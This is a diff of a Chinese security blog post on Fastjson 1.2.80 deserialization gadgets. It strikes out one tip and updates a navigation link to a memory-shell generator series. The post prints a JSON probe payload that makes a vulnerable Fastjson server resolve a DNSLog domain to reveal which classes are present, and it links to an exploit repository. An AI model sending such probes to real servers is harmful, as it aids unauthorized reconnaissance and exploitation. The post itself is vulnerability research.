@@ -139,7 +139,7 @@
 <p>第二步的重点在于，既然不能显示指定期望类，就只能依靠<code>deserializer</code>去自动处理，我们需要构造出让它解析时进到特定<code>deserializer</code>分支的特定格式。对此我提供一个<code>aspectj</code>读文件的具体实现便于师傅们理解复现。更多Gadgets浅蓝师傅在Slides中写得很清楚了，可以自行构造。</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/hosch3n/FastjsonVulns">https://github.com/hosch3n/FastjsonVulns</a></p>
 <p><img src="/img/fastjson1280_a.png"></p>
-<h2 id="两点小坑"><a href="#两点小坑" class="headerlink" title="两点小坑"></a>两点小坑</h2><p>再提醒两点小坑，一是如果DNSLog是用p师傅的CoNote，存在下划线时是不会被记录到的（这个问题让我自闭了一阵</p>
+<h2 id="两点小坑"><a href="#两点小坑" class="headerlink" title="两点小坑"></a>两点小坑</h2><p>再提醒两点小坑，<del>一是如果DNSLog是用p师傅的CoNote，存在下划线时是不会被记录到的（这个问题让我自闭了一阵</del></p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.net.Inet4Address&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;val&quot;</span>:&#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.String&quot;</span>&#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.util.Locale&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;val&quot;</span>:&#123;</span><br><span class="line">            &quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,&#123;</span><br><span class="line">                &quot;@type&quot;:&quot;java.lang.String&quot;</span><br><span class="line">                &quot;@type&quot;:&quot;java.util.Locale&quot;,</span><br><span class="line">                &quot;country&quot;:&quot;g.token.dnslog.pw&quot;,</span><br><span class="line">                &quot;language&quot;:&#123;</span><br><span class="line">                    &quot;@type&quot;:&quot;java.lang.String&quot;&#123;</span><br><span class="line">                    &quot;x&quot;:&#123;</span><br><span class="line">                        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">                        &quot;val&quot;:&quot;org.python.antlr.ParseException&quot;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
 <p>二是目前测试来看只有MacOS可以ping带花括号的域名，Linux和Windows会报错。所以这个探测链的Poc需要要合适的报错环境才能看到结果。</p>
@@ -152,8 +152,8 @@
             <a href="/tags/unserialize/">unserialize</a>
             </div>
         
-        <nav class="post-nav"><a class="next" href="/2022/08/09/Msmap%E5%86%85%E5%AD%98%E9%A9%AC%E7%94%9F%E6%88%90%E6%A1%86%E6%9E%B6%EF%BC%88%E4%BA%8C%EF%BC%89/">
-        <span class="next-text nav-default">Msmap内存马生成框架（二）</span>
+        <nav class="post-nav"><a class="next" href="/2022/08/17/Msmap%E5%86%85%E5%AD%98%E9%A9%AC%E7%94%9F%E6%88%90%E6%A1%86%E6%9E%B6%EF%BC%88%E4%B8%89%EF%BC%89/">
+        <span class="next-text nav-default">Msmap内存马生成框架（三）</span>
         <span class="prev-text nav-mobile">下一篇</span>
         <i class="iconfont icon-right"></i>
       </a>
